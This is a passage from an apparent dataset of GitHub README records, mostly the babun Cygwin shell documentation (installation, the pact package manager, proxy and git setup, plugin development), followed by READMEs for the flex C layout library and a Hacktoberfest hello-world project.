DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\r\nHave a look at a 2 minutes long screencast by https:\/\/twitter.com\/tombujok[@tombujok]: http:\/\/vimeo.com\/95045348\r\n\r\nvideo::95045348[vimeo, width=827, height=465, align=\"center\"]\r\n\r\n\/\/ https:\/\/www.youtube.com\/watch?v=_h1wJJO0Ukw&vq=hd720\r\n\r\n\/\/ video::VOHIYhbRIq0[youtube, width=560, height=315, align=\"center\"]\r\n\r\n\/\/ https:\/\/www.youtube.com\/watch?v=VOHIYhbRIq0\r\n\r\n== Installation\r\n\r\nJust download the dist file from http:\/\/babun.github.io, unzip it and run the install.bat script. After a few minutes babun starts automatically.\r\nThe application will be installed to the `%USER_HOME%\\.babun` directory. Use the '\/target' option to install babun to a custom directory.\r\n\r\nNOTE: There is no interference with existing Cygwin installation\r\n\r\nNOTE: You may have \"whitespace\" chars in your username - it is not recommended by Cygwin though http:\/\/cygwin.com\/faq.html#faq.setup.name-with-space[FAQ]\r\n\r\n\r\n== Features in 10 seconds\r\n\r\nBabun features the following:\r\n\r\n* Pre-configured Cygwin with a lot of addons\r\n* Silent command-line installer, no admin rights required\r\n* pact - advanced package manager (like apt-get or yum)\r\n* xTerm-256 compatible console\r\n* HTTP(s) proxying support\r\n* Plugin-oriented architecture\r\n* Pre-configured git and shell\r\n* Integrated oh-my-zsh\r\n* Auto update feature\r\n* \"Open Babun Here\" context menu entry\r\n\r\nHave a look at a sample screenshot!\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_vim.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\nDo you like it? Follow babun on Twitter https:\/\/twitter.com\/babunshell[@babunshell] or https:\/\/twitter.com\/tombujok[@tombujok].\r\n\r\n== Features in 3 minutes\r\n\r\n=== Cygwin\r\n\r\nThe core of Babun consists of a pre-configured Cygwin. Cygwin is a great tool, but there's a lot of quirks and tricks that makes you lose a lot of time to make it actually 'usable'. Not only does babun solve most of these problems, but also contains a lot of vital packages, so that you can be productive from the very first minute. \r\n\r\n=== Package manager\r\n\r\nBabun provides a package manager called `pact`. It is similar to 'apt-get' or 'yum'. Pact enables installing\/searching\/upgrading and deinstalling cygwin packages with no hassle at all. Just invoke `pact --help` to check how to use it.\r\n\r\n=== Shell\r\n\r\nBabun's shell is tweaked in order to provide the best possible user-experience. There are two shell types that are pre-configured and available right away - bash and zsh (zsh is the default one). Babun's shell features:\r\n\r\n* syntax highlighting\r\n* UNIX tools\r\n* software development tools\r\n* git-aware prompt \r\n* custom scripts and aliases\r\n* and much more!\r\n\r\n=== Console\r\n\r\nMintty is the console used in babun. It features an `xterm-256` mode, nice fonts and simply looks great!\r\n\r\n=== Proxying\r\n\r\nBabun supports HTTP proxying out of the box. Just add the address and the credentials of your HTTP proxy server to the `.babunrc` file located in your home folder and execute `source .babunrc` to enable HTTP proxying. SOCKS proxies are not supported for now.\r\n\r\n=== Developer tools\r\n\r\nBabun provides many packages, convenience tools and scripts that make your life much easier. The long list of features includes:\r\n\r\n* programming languages (Python, Perl, etc.)\r\n* git (with a wide variety of aliases and tweaks)\r\n* UNIX tools (grep, wget, curl, etc.)\r\n* vcs (svn, git)\r\n* oh-my-zsh\r\n* custom scripts (pbcopy, pbpaste, babun, etc.)\r\n\r\n=== Plugin architecture\r\n\r\nBabun has a very small microkernel (cygwin, a couple of bash scripts and a bit of a convention) and a plugin architecture on the top of it. It means that almost everything is a plugin in the babun's world! Not only does it structure babun in a clean way, but also enables others to contribute small chunks of code. Currently, babun comprises the following plugins:\r\n\r\n* cacert\r\n* core\r\n* git\r\n* oh-my-zsh\r\n* pact\r\n* cygdrive\r\n* dist\r\n* shell\r\n\r\n=== Auto-update\r\n\r\nSelf-update is at the very heart of babun! Many Cygwin tools are simple bash scripts - once you install them there is no chance of getting the newer version in a smooth way. You either delete the older version or overwrite it with the newest one losing all the changes you have made in between.\r\n\r\nBabun contains an auto-update feature which enables updating both the microkernel, the plugins and even the underlying cygwin. Files located in your home folder will never be deleted nor overwritten which preserves your local config and customizations.\r\n\r\n=== Installer\r\n\r\nBabun features an silent command-line installation script that may be executed without admin rights on any Windows hosts.\r\n\r\n== Using babun\r\n\r\n=== Setting up proxy\r\nTo setup proxy uncomment following lines in the `.babunrc` file `(%USER_HOME%\\.babun\\cygwin\\home\\USER\\.babunrc)`\r\n----\r\n# Uncomment this lines to set up your proxy\r\n# export http_proxy=http:\/\/user:password@server:port\r\n# export https_proxy=$http_proxy\r\n# export ftp_proxy=$http_proxy\r\n# export no_proxy=localhost\r\n----\r\n\r\n=== Setting up git\r\nBabun has a pre-configured git. The only thing you should do after the installation is to add your name and email to the git config:\r\n----\r\ngit config --global user.name \"your name\"\r\ngit config --global user.email \"your@email.com\"\r\n----\r\n\r\nThere's a lot of great git aliases provided by the git plugin:\r\n----\r\ngitalias['alias.cp']='cherry-pick'\r\ngitalias['alias.st']='status -sb'\r\ngitalias['alias.cl']='clone'\r\ngitalias['alias.ci']='commit'\r\ngitalias['alias.co']='checkout'\r\ngitalias['alias.br']='branch'\r\ngitalias['alias.dc']='diff --cached'\r\ngitalias['alias.lg']=\"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %Cblue<%an>%Creset' --abbrev-commit --date=relative --all\"\r\ngitalias['alias.last']='log -1 --stat'\r\ngitalias['alias.unstage']='reset HEAD --'\r\n----\r\n\r\n=== Installing and removing packages\r\nBabun is shipped with `pact` - a Linux like package manager. It uses the cygwin repository for downloading packages:\r\n----\r\n{ ~ } \u00bb pact install arj                                                                     ~ \r\nWorking directory is \/setup\r\nMirror is http:\/\/mirrors.kernel.org\/sourceware\/cygwin\/\r\nsetup.ini taken from the cache\r\n\r\nInstalling arj\r\nFound package arj\r\n--2014-03-30 19:34:38--  http:\/\/mirrors.kernel.org\/sourceware\/cygwin\/\/x86\/release\/arj\/arj-3.10.22-1.tar.bz2\r\nResolving mirrors.kernel.org (mirrors.kernel.org)... 149.20.20.135, 149.20.4.71, 2001:4f8:1:10:0:1994:3:14, ...\r\nConnecting to mirrors.kernel.org (mirrors.kernel.org)|149.20.20.135|:80... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 189944 (185K) [application\/x-bzip2]\r\nSaving to: `arj-3.10.22-1.tar.bz2'\r\n\r\n100%[=======================================>] 189,944      193K\/s   in 1.0s\r\n\r\n2014-03-30 19:34:39 (193 KB\/s) - `arj-3.10.22-1.tar.bz2' saved [189944\/189944]\r\n\r\nUnpacking...\r\nPackage arj installed\r\n----\r\n\r\nHere's the list of all pact's features:\r\n----\r\n{ ~ }  \u00bb pact --help                                                                            \r\npact: Installs and removes Cygwin packages.\r\n\r\nUsage:\r\n  \"pact install <package names>\" to install given packages\r\n  \"pact remove <package names>\" to remove given packages\r\n  \"pact update <package names>\" to update given packages\r\n  \"pact show\" to show installed packages\r\n  \"pact find <patterns>\" to find packages matching patterns\r\n  \"pact describe <patterns>\" to describe packages matching patterns\r\n  \"pact packageof <commands or files>\" to locate parent packages\r\n  \"pact invalidate\" to invalidate pact caches (setup.ini, etc.)\r\nOptions:\r\n  --mirror, -m <url> : set mirror\r\n  --invalidate, -i       : invalidates pact caches (setup.ini, etc.)\r\n  --force, -f : force the execution\r\n  --help\r\n  --version\r\n----\r\n\r\n=== Changing the default shell\r\nThe zsh (with .oh-my-zsh) is the default babun's shell.\r\n\r\nExecuting the following command will output your default shell:\r\n----\r\n{ ~ } \u00bb babun shell                                                                          ~ \r\n\/bin\/zsh\r\n----\r\n\r\nIn order to change your default shell execute:\r\n----\r\n{ ~ } \u00bb babun shell \/bin\/bash                                                                ~ \r\n\/bin\/zsh\r\n\/bin\/bash\r\n----\r\nThe output contains two lines: the previous default shell and the new default shell\r\n\r\n=== Checking the configuration\r\n\r\nExecute the following command the check the configuration:\r\n----\r\n{ ~ }  \u00bb babun check                                                                         ~\r\nExecuting babun check\r\nPrompt speed      [OK]\r\nConnection check  [OK]\r\nUpdate check      [OK]\r\nCygwin check      [OK]\r\n----\r\n\r\nBy executing this command you can also check whether there is a newer cygwin version available:\r\n----\r\n{ ~ }  \u00bb babun check                                                                            ~\r\nExecuting babun check\r\nPrompt speed      [OK]\r\nConnection check  [OK]\r\nUpdate check      [OK]\r\nCygwin check      [OUTDATED]\r\nHint: the underlying Cygwin kernel is outdated. Execute 'babun update' and follow the instructions!\r\n----\r\n\r\nIt will check if there are problems with the speed of the git prompt, if there's access to the Internet or finally if you are running the newest version of babun.\r\n\r\nThe command will output hints if problems occur:\r\n----\r\n{ ~ } \u00bb babun check                                                                          ~ \r\nExecuting babun check\r\nPrompt speed      [SLOW]\r\nHint: your prompt is very slow. Check the installed 'BLODA' software.\r\nConnection check  [OK]\r\nUpdate check      [OK]\r\nCygwin check      [OK]\r\n----\r\n\r\nOn each startup, but only every 24 hours, babun will execute this check automatically. You can disable the automatic check in the ~\/.babunrc file.\r\n\r\n=== Tweaking the configuration\r\n\r\nYou can tweak some config options in the ~\/.babunrc file. Here's the full list of variables that may be modified:\r\n----\r\n# JVM options\r\nexport JAVA_OPTS=\"-Xms128m -Xmx256m\"\r\n\r\n# Modify these lines to set your locale\r\nexport LANG=\"en_US.UTF-8\"\r\nexport LC_CTYPE=\"en_US.UTF-8\"\r\nexport LC_ALL=\"en_US.UTF-8\"\r\n\r\n# Uncomment these lines to the set your machine's default locale (and comment out the UTF-8 ones)\r\n# export LANG=$(locale -uU)\r\n# export LC_CTYPE=$(locale -uU)\r\n# export LC_ALL=$(locale -uU)\r\n\r\n# Uncomment this to disable daily auto-update & proxy checks on startup (not recommended!)\r\n# export DISABLE_CHECK_ON_STARTUP=\"true\"\r\n\r\n# Uncomment to increase\/decrease the check connection timeout\r\n# export CHECK_TIMEOUT_IN_SECS=4\r\n\r\n# Uncomment this lines to set up your proxy\r\n# export http_proxy=http:\/\/user:password@server:port\r\n# export https_proxy=$http_proxy\r\n# export ftp_proxy=$http_proxy\r\n# export no_proxy=localhost\r\n----\r\n\r\n=== Updating babun\r\n\r\nTo update babun to the newest version execute:\r\n----\r\nbabun update\r\n----\r\nPlease note that your local configuration files will not be overwritten. \r\n\r\nThe 'babun update' command will also update the underlying cygwin version if never version is available. In such case babun will download the new cygwin installer, close itself and start the cygwin installation process. Once cygwin installation is completed babun will restart.\r\n\r\n== Screenshots\r\n\r\n\r\n[big]#Startup screen#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_welcome.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Pact - package installation#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_pact_install.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Pact - package installed#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_pact_installed.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Babun oh-my-zsh - auto-update#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_zsh_update.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n\r\n[big]#VIM syntax highlighting#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_vim.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Nano syntax highlighting#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_nano.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Git aliases - git lg#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_git_lg.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Git aliases - git st#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_git_st.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Shell prompt#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_shell.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Babun update#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_update.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n[big]#Open Babun here - Context Menu#\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/screenshots\/screen_context_menu.png[babun - a Windows shell you will love!, align=\"center\"]\r\n\r\n\r\n== Development\r\n\r\n\r\n== Project structure\r\n\r\nThe project consists of five modules.\r\n\r\n=== babun-packages\r\n\r\nThe main goal of the `babun-packages` module is to download the cygwin packages listed in the `conf\/cygwin.x86.packages` file.\r\nThe above mentioned packages will be downloaded together with the whole dependency tree. Repositories which the packages are downloaded from are listed in the `conf\/cygwin.repositories` file. At the beginning the first repository is taken, if a package is not available in this repo the second repo is used, etc. The process continues until all packages have been downloaded. \r\n\r\nAll downloaded packages are stored in the `target\/babun-packages` folder.\r\n\r\n=== babun-cygwin\r\n\r\nThe main goal of the `babun-cygwin` module is to download and invoke the native cygwin.exe installer. The packages downloaded by the babun-packages module are used as the input - all of them will be installed in the offline cygwin installation. \r\n\r\nIt is not trivial to install and zip a local instance of Cygwin - there are problems with the symlinks as the symlink-file-flags are lost during the compression process. Babun can work it around though. At first, just after the installation, the `symlinks_find.sh` script is invoked in order to store the list of all cygwin's symlinks. This file is delivered as a part of the the babun's core. Then, after babun is installed from the zip file on the user's host the `symlinks_repair.sh` script is invoked - it will correct all the broken symlinks listed in the above mentioned file.\r\n\r\nPreinstalled cygwin is located in the `target\/babun-cygwin` folder.\r\n\r\n=== babun-core\r\n\r\nThe main goal of the `babun-core` module is to install babun's core along with all the plugins and tools. `install.sh` script is invoked during the creation of the distribution package in order to preinstall the plugins. Whenever babun is installed on the user's host the `install_home.sh` script is invoke in order to install the babun-related files to the cygwin-user's home folder.\r\n\r\nPreinstalled cygwin with installed babun is located in the `target\/babun-cygwin` folder.\r\n\r\n=== babun-dist\r\n\r\nThe main goal of the `babun-dist` module is to zip the ready-made instance of babun, copy some installation scripts and zip the distribution.\r\n\r\nDistribution package is located in the `target\/babun-dist` folder.\r\n\r\n=== babun-doc\r\n\r\nThis module contains documentation written in ASCIIDOC.\r\n\r\n\r\n== Building from source\r\n\r\nThe project is regularly build on Jenkins, on a slave node featuring the Windows Server OS. The Windows OS is required to fully build the distribution package as one of the goals invokes the native `cygwin.exe` installer. The artifacts created by each module are cached\/stored in the target folder after a successful build of each step. This mechanism is not intelligent enough to calculate the diffs so if you would like to fully rebuild the whole dist package make sure to invoke the `clean` goal before the `package` goal. For now it's not possible to invoke a build of a selective modules only. \r\n\r\nIn order to build the dist package invoke:\r\n----\r\ngroovy build.groovy package \r\n----\r\n\r\nIn order to clean the project target folder invoke:\r\n----\r\ngroovy build.groovy clean \r\n----\r\n\r\nIn order to publish the release version to bintray invoke:\r\n----\r\ngroovy build.groovy release\r\n----\r\nThe release goal expects the following environment variables: `bintray_user` and `bintray_secret`\r\n\r\n== Developing a plugin\r\n\r\nEvery plugin has to consist of three main files:\r\n\r\n* install.sh - a file that will be executed during the creation of the babun's distribution\r\n* install_home.sh - a file that will be executed during the installation of babun to the user's home folder \r\n* plugin.desc - a plugin description that contains the plugin_name and plugin_version variables\r\n* start.sh (optional) - a file that will be executed on babun startup\r\n* exec.sh (optional) - a file that allows adding commands to babun script\r\n\r\nHave a look at the pact plugin - it's a perfect example of a relatively small plugin using all the features.\r\n\r\n=== install.sh\r\n\r\nIts main responsibility is to install the plugin - for example to copy the plugin files to, e.g. `\/usr\/local\/etc` or `\/usr\/local\/bin` directories. install.sh script is also responsible for preparing the user's home folder template. The template files have to be copied to the `\/usr\/local\/babun\/home\/<plugin_name>` folder.\r\n\r\ninstall.sh will be invoked many times - on every plugin update if the plugin version is higher than the version of the installed plugin - thus it's logic has to work in an incremental way. This mechanism is invoked automatically though. The plugin does not have to contain the version check.\r\n\r\nThe script has to begin with the following statement:\r\n----\r\n#!\/bin\/bash\r\nset -e -f -o pipefail\r\nsource \"\/usr\/local\/etc\/babun\/source\/babun-core\/tools\/script.sh\"\r\n----\r\n\r\n=== install_home.sh\r\n\r\nIts main responsibility is to configure the user's home folder with the plugin related stuff, if necessary. For example, it may copy the files from the `\/usr\/local\/babun\/home\/<plugin_name>` folder to the user's home folder.\r\nIt is also responsible for any other things that may be necessary during the user's home configuration process.\r\n\r\ninstall_home.sh will be invoked many times - on every plugin update if the plugin version is higher than the version of the installed plugin - thus it's logic has to work in an incremental way.\r\n\r\nBoth scripts (install.sh and install_home.sh) scripts have to begin with the following statement:\r\n----\r\n#!\/bin\/bash\r\nset -e -f -o pipefail\r\nsource \"\/usr\/local\/etc\/babun\/source\/babun-core\/tools\/script.sh\"\r\n----\r\n\r\n=== uninstall.sh (optional)\r\n\r\nIts responsibility is to cleanup all entries that a plugin may leave for example on the filesystem or in the windows registry.\r\n\r\n=== plugin.desc\r\n\r\nA plugin descriptor looks like this:\r\n----\r\n# plugin descriptor\r\nplugin_name=pact\r\nplugin_version=1\r\n----\r\n\r\nEvery time the plugin is changed the version has to be incremented. Otherwise the newest version will not be installed.\r\n\r\n=== start.sh (optional)\r\n\r\nThe start.sh is an optional script for plugins that require triggering certain actions on every babun start (for example update check).\r\n\r\n=== exec.sh (optional)\r\n\r\nIf the plugin folder contains an exec.sh script, \r\nwhenever `babun <plugin_name> xxx yyy` command is invoked, the execution is passed to `<plugin_name>\/exec.sh` script with params `xxx yyy`. \r\nIn this way a plugin may add some additional shell commands without implementing its own `\/usr\/local\/bin\/xxx` script.\r\n\r\n== Branches\r\n\r\nThe babun's repository contains three main branches:\r\n\r\n* master - development branch\r\n* candidate - release candidate branch, no direct commits, only fast forwards from the master\/other branch\r\n* release - release, no direct commits, only fast forwards from the candidate branch\r\n\r\nIn order to check babun update against other branch (for example during a development of a plugin), set the babun_branch variable to (master or candidate). External repo's are not supporter (this mechanism has to be extended to include user's repos).\r\n\r\n== Folder structure in Cygwin\r\n\r\nAn instance of babun installed in Cygwin is located in the `\/usr\/local\/etc\/babun` folder.\r\nThe folder structure looks like this:\r\n----\r\n\u251c\u2500\u2500 babun\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 external\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 oh-my-zsh\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 home\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 core\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 oh-my-zsh\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 pact\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 shell\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 installed\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cacert\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 core\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 git\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 oh-my-zsh\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 pact\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 shell\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 source\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun.version\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun-core\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun-cygwin\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun-dist\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun-doc\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 babun-packages\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 build.groovy\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 README.adoc\r\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 stamps\r\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 check\r\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 welcome\r\n\u251c\u2500\u2500 babun.bash\r\n\u251c\u2500\u2500 babun.instance\r\n\u251c\u2500\u2500 babun.rc\r\n\u251c\u2500\u2500 babun.start\r\n\u2514\u2500\u2500 babun.zsh\r\n\r\n16 directories, 17 files\r\n----\r\n\r\n=== source\r\n\r\nThe folder contains the sources of babun checkout from github.\r\n\r\n=== stamps\r\n\r\nThe folder contains files which modification time indicates certain things to babun. For example `babun check` is executed automatically on babun's start up every 24 hours. Whenever it's invoked a file named `checked` is being modified (the content of the modification does not matter).Whenever the mod_time of this file is not within 24 hours and babun is being started a `babun check` will be invoked and the file `check` located in the `stamps` folder will be modified again.\r\n\r\n=== installed\r\n\r\nThe folder contains files that indicated which versions of babun's plugins and babun itself are installed. Each file contains a number - for example: a file named `core` contains has one line with number `2` in its content. It means that the plugin `core` is installed and has version `2`\r\n\r\n=== external\r\n\r\nThe folder contains external resources, like cloned repos of other projects (for example oh-my-zsh).\r\n\r\n=== home\r\n\r\nThe folder contains folders named like plugins. If a plugin needs to install something to user's folder this content has to be copied to `home\/<plugin_name>` folder. It's just a store of the user's home files, so that whenever a new user's account is created babun can install user's home related content to the user's home folder (it's the plugin install_home.sh script's responsibility, however, to copy this content to the actual user's home folder). \r\n\r\n\r\n== Licence\r\n\r\nThe source code located in the babun's repository is published under the Apache License, Version 2.0, January 2004 if not stated otherwise. \r\n\r\nSince the distribution (zip) package contains the Cygwin's DLLs the distribution package is licensed under the GPLv3+ licence to satisfy the Cygwin's licensing terms (http:\/\/cygwin.com\/licensing.html).\r\n\r\n== Supporters\r\n\r\nSpecial thanks go to companies who provided free hosting! \r\n\r\n=== XCLOUD\r\n\r\nhttp:\/\/xcloud.me\/[XCLOUD.ME] provided a free hosted OS X instance (a free Xcloud Mini Server subscription). It works like a charm! Thank you!\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/xcloud_logo.png[\"XCLOUD\", link=\"http:\/\/xcloud.me\/\", window=\"_blank\"]\r\n\"Run, manage and scale your virtual dedicated OS X Server in the Cloud.\"\r\n\r\n_XCLOUD is a trademark of AG from Switzerland._\r\n\r\n=== Windows Azure\r\n\r\nhttp:\/\/www.azure.microsoft.com[Windows Azure] provided a free Windows Hosting (a free, renewable MSDN subscription). Everything was organised by @bureado. Thank you!\r\n\r\nimage::https:\/\/raw.githubusercontent.com\/babun\/babun.github.io\/master\/images\/ms_azure_logo.png[\"Windows Azure\", link=\"http:\/\/www.azure.microsoft.com\", window=\"_blank\"]\r\n\r\n_Microsoft and Windows are registered trademarks of Microsoft Corporation in the United States of America and other countries. Windows Azure is a trademark of Microsoft Corporation._\r\n\r\n\r\n== Contribute\r\n\r\nBabun is open source and driven by the community. There are many ways to contribute:\r\n\r\n* Use it and tell us what you think\r\n* Recommend it to your friends\r\n* Submit a https:\/\/github.com\/babun\/babun\/issues[feature request] or a https:\/\/github.com\/babun\/babun\/issues[bug report]\r\n* Fork it on https:\/\/github.com\/babun\/babun[github] and submit pull request\r\n* Motivate the community, tweet about the project and star it on github :)\r\n\r\nWe are looking for new contributors, so if you fancy bash programming and if you would like to contribute a patch or a code up a new plugin give us a shout!\r\n\r\nVisit the http:\/\/babun.github.io\/development\/[development] section to find out how to create plugins and extensions.\r\n\r\n== Meet the team\r\n\r\nhttps:\/\/twitter.com\/tombujok[@tombujok]\r\n\r\nhttps:\/\/twitter.com\/lukaszpielak[@lukaszpielak]\r\n\r\nimage::https:\/\/d2weczhvl823v0.cloudfront.net\/reficio\/babun\/trend.png[\"Bitdeli Badge\", link=\"https:\/\/bitdeli.com\/free\"]\r\n"},{"repo":"\/xamarin\/flex","language":"C","readme_contents":"# flex\n\nflex is a flexible box layout system following the <a href=\"https:\/\/www.w3.org\/TR\/css-flexbox-1\/\">CSS flexbox module<\/a> specifications. The goal is to offer a fully compliant implementation with a small and maintainable code base under a permissive license.\n\nflex exposes a plain C API with the same parameters that you would use in CSS to customize the layout of a flexible view hierarchy. The API is designed to be easily interoperable with foreign runtimes (ex. C#) and meant to be used by widget toolkits as the foundation of a view layout API.\n\nflex supports both single and multiple (wrap) lines layouts.\n\n## Getting Started\n\nIf you program in C# you can go straight to the [bindings\/csharp](bindings\/csharp) directory.\n\nIf you program in a C-compatible environment you can simply copy the `flex.c` and `flex.h` files to your project. The code was written to be cross-platform and does not require dependencies.\n\nOn a Mac you can also generate static and dynamic libraries for iOS, Android and macOS using `make`:\n\n```\n$ make macos\n$ make ios\n$ make android\n$ make             # builds everything\n```\n\nMake sure to have the `ANDROID_NDK` environment variable set to the path where the Android NDK is located in your system. You can also tweak build variables by editing the `Makefile` file.\n\nOn a Windows machine you can generate dynamic libraires (DLL) for x86, x64, ARM and ARM64 by opening the Visual Studio project file or running `msbuild` from the command line.\n\n## Demo App\n\nUnder the `demo` directory you will find an Xcode project that will build a Mac demo app. The app exposes the entire set of flexbox parameters that are implemented and lets you create views (including nested ones), similar to how you would build a more realistic user interface in practice.\n\n## Implementation Status\n\n| Attribute | Status |\n|---|---|\n| width, height | :ok: |\n| self_sizing | :ok: |\n| padding | :ok: |\n| margin | :ok: |\n| justify_content flex_start | :ok: |\n| justify_content flex_end | :ok: |\n| justify_content center | :ok: |\n| justify_content space_around | :ok: |\n| justify_content space_between | :ok: |\n| justify_content space_evenly | :ok: |\n| align_content flex_start | :ok: |\n| align_content flex_end | :ok: |\n| align_content center | :ok: |\n| align_content space_around | :ok: |\n| align_content space_between | :ok: |\n| align_content space_evenly | :ok: |\n| align_content stretch | :ok: |\n| align_items flex_start | :ok: |\n| align_items flex_end | :ok: |\n| align_items center | :ok: |\n| align_items stretch | :ok: |\n| align_self flex_start | :ok: |\n| align_self flex_end | :ok: |\n| align_self center | :ok: |\n| align_self stretch | :ok: |\n| position relative | :ok: |\n| position absolute | :ok: |\n| direction column | :ok: |\n| direction column_reverse | :ok: |\n| direction row | :ok: |\n| direction row_reverse | :ok: |\n| wrap no_wrap | :ok: |\n| wrap wrap | :ok: |\n| wrap wrap_reverse | :ok: |\n| grow | :ok: |\n| shrink | :ok: |\n| order | :ok: |\n| basis | :ok: |\n\n## Tests\n\nThere is a test suite in the `tests` directory. See the [tests\/README.md](tests\/README.md) file for more details on how to build, run and contribute to the test suite.\n\n## License\n\nflex is distributed under the terms of the MIT license. See the `LICENSE.txt` file for more information.\n"},{"repo":"\/cbitosc\/CBIT-Hacktoberfest-Hackathon-Hello-World","language":"C","readme_contents":"# Welcome to CBIT Hacktoberfest Hackathon 2018\n> This Project aims to help you to get started with using Github. You can find a tutorial [here](https:\/\/guides.github.com\/activities\/hello-world\/)\n\n![poster](https:\/\/user-images.githubusercontent.com\/22680912\/46479049-d8a9c400-c80b-11e8-92a1-89fc10701f4a.jpg)\n\n# What is Hacktoberfest?\nHacktoberfest is a program by Digital Ocean and Github, where you can easily win a T-Shirt just by making 5 pull requests in the month of October to any open source projects on Github.\n\n## Steps to follow :scroll:\n\n### 1. Register for Hacktoberfest\nYou can register from [here](https:\/\/hacktoberfest.digitalocean.com).\n\n### 2. Fork it :fork_and_knife:\n\nYou can get your own fork\/copy of [Hello-world](https:\/\/github.com\/cbitosc\/Hacktoberfest-Hackathon-Hello-World) by using the <a href=\"https:\/\/github.com\/cbitosc\/Hacktoberfest-Hackathon-Hello-World\/new\/master?readme=1#fork-destination-box\"><kbd><b>Fork<\/b><\/kbd><\/a> button or clicking [this](https:\/\/github.com\/cbitosc\/Hacktoberfest-Hackathon-Hello-World\/new\/master?readme=1#fork-destination-box).\n\n [![Fork Button](https:\/\/help.github.com\/assets\/images\/help\/repository\/fork_button.jpg)](https:\/\/github.com\/cbitosc\/Hacktoberfest-Hackathon-Hello-World)\n\n### 3. Add a Program in any Language you like :rabbit2:\nOnce you have forked the repo, add your program in the language folder in \nmain branch, if there is no language folder, make one, then add into it.\nYou can take a look to the [Programming Language List](https:\/\/en.wikipedia.org\/wiki\/List_of_programming_languages) in Wikipedia to create a new one HelloWorld !\n\n### 4. Ready, Steady, Go... :turtle: :rabbit2:\n\nOnce you have completed these steps, you are ready to start contributing \nby checking our `Help Wanted` issues and creating [pull requests](https:\/\/github.com\/cbitosc\/Hacktoberfest-Hackathon-Hello-World\/pulls).\n\n### 5. Give this Project a Star :star:\n\nIf you liked working on this project, please share this project as much \nas you can and star this project to help as many people in opensource as you can.\n\n:tada: :confetti_ball: :smiley: 